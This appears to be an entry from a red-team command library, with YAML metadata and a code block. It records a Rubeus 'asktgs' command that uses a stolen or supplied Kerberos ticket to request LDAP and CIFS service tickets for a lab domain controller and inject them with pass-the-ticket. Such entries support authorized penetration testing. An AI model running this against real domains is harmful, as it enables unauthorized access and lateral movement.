---
id: 832e0b11-11af-4ea2-95ef-3bde45c37b16
name: Ask TGS
type: command
executor: bash
data: .\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local
  /ptt
output: null
created_at: '2023-04-06T03:56:07.584722+00:00'
updated_at: '2023-04-10T20:25:48.071449+00:00'
---

# Ask TGS

```bash
.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
```
